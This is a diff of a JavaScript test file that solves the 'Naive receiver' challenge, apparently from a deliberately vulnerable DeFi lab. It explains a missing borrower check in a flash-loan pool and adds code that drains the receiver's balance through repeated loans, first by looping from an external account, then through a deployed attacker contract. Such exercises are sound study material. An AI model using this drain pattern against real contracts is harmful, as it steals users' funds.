@@ -34,12 +34,27 @@ describe('[Challenge] Naive receiver', function () {
         /* 
             Vulnerability:
             The LenderPool.flashLoan function does not check that the borrower is also msg.sender
-            allowing the attaker to drain the recipient's balance by making repeated loans on the
+            allowing an attacker to drain the recipient's balance by making repeated loans on the
             recipient's behalf
         */
+        /* 
+            Multiple Tx solution:
+            Call the pool multiple times as EOA attacker until the receiver's balance is 0
+        */
+        /*
         while(await ethers.provider.getBalance(this.receiver.address) > 0) {
             await this.pool.connect(attacker).flashLoan(this.receiver.address, 0);
         }
+        */
+      
+        /*
+            Single Tx solution:
+            Create a custom contract which calls the flash loan function until the receiver's
+            balance is 0
+        */
+        const AttackerContractFactory = await ethers.getContractFactory('AttackerContract', deployer);
+        this.attackerContract = await AttackerContractFactory.deploy(this.pool.address, this.receiver.address);
+        await this.attackerContract.attack()
     });
 
     after(async function () {
